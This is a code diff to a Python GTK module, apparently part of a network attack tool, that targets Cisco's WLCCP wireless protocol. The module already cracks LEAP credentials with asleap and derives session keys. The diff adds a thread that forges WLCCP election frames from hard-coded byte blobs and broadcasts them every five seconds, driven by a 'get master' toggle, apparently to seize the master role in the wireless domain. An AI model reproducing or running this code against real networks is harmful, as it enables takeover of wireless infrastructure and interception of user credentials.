@@ -31,14 +31,17 @@
 
 import hashlib
 import struct
+import socket
 import sys
 import threading
+import time
 import traceback
 
 import gobject
 import gtk
 
 import dnet
+import dpkt
 
 import asleap
 
@@ -108,6 +111,53 @@ class wlccp_eap_auth(object):
         (self.aaa_msg_type, self.aaa_auth_type, self.aaa_key_mgmt_type, self.status_code) = struct.unpack("!BBBB", data[8:12])
         return data[12:]
 
+class election_thread(threading.Thread):
+    WLCCP_DST_MAC = "01:40:96:ff:ff:c0"
+    WLCCP_ETH_TYPE = 0x2d87
+    BLOB1 = "\x00\x1f\x00\x10\x00\x08"
+    BLOB2 = "\x00\x03\x00\x0c"
+    BLOB3 = "\x18\x00\x00\x00"
+    BLOB4 = "\x00\x23\x00\x06\x00\x01"
+    BLOB5 = "\x00\x25\x00\x06\x00\x00"
+    
+    def __init__(self, parent, mac, ip):
+        self.parent = parent
+        self.mac = mac
+        self.ip = ip
+        self.running = True
+        self.delay = 5
+        threading.Thread.__init__(self)
+    
+    def run(self):
+        self.parent.log("WLCCP: Election Thread started")
+        #~ version=None, sap=None, dst_type=None, msg_type=None, id=None, flags=None, orig_node_type=None, orig_node_mac=None, dst_node_type=None, dst_node_mac=None):
+        header = wlccp_header(0xc1, 0x0, 0x8003, 0x41, 0x0, 0x2800, 0x0, dnet.eth_aton("00:00:00:00:00:00"), 0x2, dnet.eth_aton(self.mac))
+        h_data = header.render("%s\x00\x01\x00\x00\xff\x00%s\x00\x00\x00\x00\x00\x02\x00\x00\x00\x05%s%s%s%s%s%s%s%s"
+                    % ( dnet.eth_aton(self.mac),
+                        dnet.eth_aton(self.mac),
+                        self.BLOB1,
+                        dnet.eth_aton(self.mac),
+                        dnet.ip_aton(self.ip),
+                        self.BLOB2,
+                        dnet.ip_aton(self.ip),
+                        self.BLOB3,
+                        self.BLOB4,
+                        self.BLOB5
+                        )  )
+        data = dnet.eth_pack_hdr(dnet.eth_aton(self.WLCCP_DST_MAC), dnet.eth_aton(self.mac), socket.htons(self.WLCCP_ETH_TYPE)) + h_data
+        
+        while self.running:
+            if self.parent.dnet:
+                self.parent.dnet.send(data)
+                for x in xrange(self.delay):
+                    if not self.running:
+                        break
+                    time.sleep(1)
+        self.parent.log("WLCCP: Election Thread terminated")
+
+    def quit(self):
+        self.running = False
+
 class mod_class(object):
     HOSTS_HOST_ROW = 0
     HOSTS_TYPE_ROW = 1
@@ -133,19 +183,23 @@ class mod_class(object):
         self.gladefile = "modules/module_wlccp.glade"
         self.hosts_liststore = gtk.ListStore(str, str)
         self.comms_liststore = gtk.ListStore(str, str, str)
+        self.dnet = None
+        self.election_thread = None
 
     def start_mod(self):
         self.hosts = {}
         self.comms = {}
 
     def shut_mod(self):
-        pass
+        if self.election_thread:
+            self.election_thread.quit()
 
     def get_root(self):
         self.glade_xml = gtk.glade.XML(self.gladefile)
         dic = { "on_crack_leap_button_clicked" : self.on_crack_leap_button_clicked,
                 "on_gen_nsk_button_clicked" : self.on_gen_nsk_button_clicked,
-                "on_gen_ctk_button_clicked" : self.on_gen_ctk_button_clicked
+                "on_gen_ctk_button_clicked" : self.on_gen_ctk_button_clicked,
+                "on_get_master_togglebutton_toggled" : self.on_get_master_togglebutton_toggled
                 }
         self.glade_xml.signal_autoconnect(dic)
 
@@ -185,6 +239,9 @@ class mod_class(object):
 
         self.wordlist_filechooserbutton = self.glade_xml.get_widget("wordlist_filechooserbutton")
         self.ctk_label = self.glade_xml.get_widget("ctk_label")
+
+        self.ip_entry = self.glade_xml.get_widget("ip_entry")
+        self.mac_entry = self.glade_xml.get_widget("mac_entry")
         
         return self.glade_xml.get_widget("root")
 
@@ -196,6 +253,16 @@ class mod_class(object):
 
     def get_eth_checks(self):
         return (self.check_eth, self.input_eth)
+
+    def set_ip(self, ip, mask):
+        self.ip = ip
+        self.mask = mask
+        self.ip_entry.set_text(self.ip)
+
+    def set_dnet(self, dnet_thread):
+        self.dnet = dnet_thread
+        self.mac = dnet.eth_ntoa(dnet_thread.eth.get())
+        self.mac_entry.set_text(self.mac)
 
     def check_eth(self, eth):
         if eth.type == 0x872d:
@@ -410,3 +477,13 @@ class mod_class(object):
                 #(ctk.encode("hex"), connection))
                 self.comms[host] = (iter, leap, leap_pw, nsk, (supp_node, dst_node, nonce_req, nonce_repl, counter), ctk)
                 self.ctk_label.set_text("CTK: %s" % ctk)
+
+    def on_get_master_togglebutton_toggled(self, btn):
+        if btn.get_active():
+            self.election_thread = election_thread(self, self.mac, self.ip)
+            self.election_thread.start()
+        else:
+            if self.election_thread:
+                self.election_thread.quit()
+                self.election_thread = None
+    
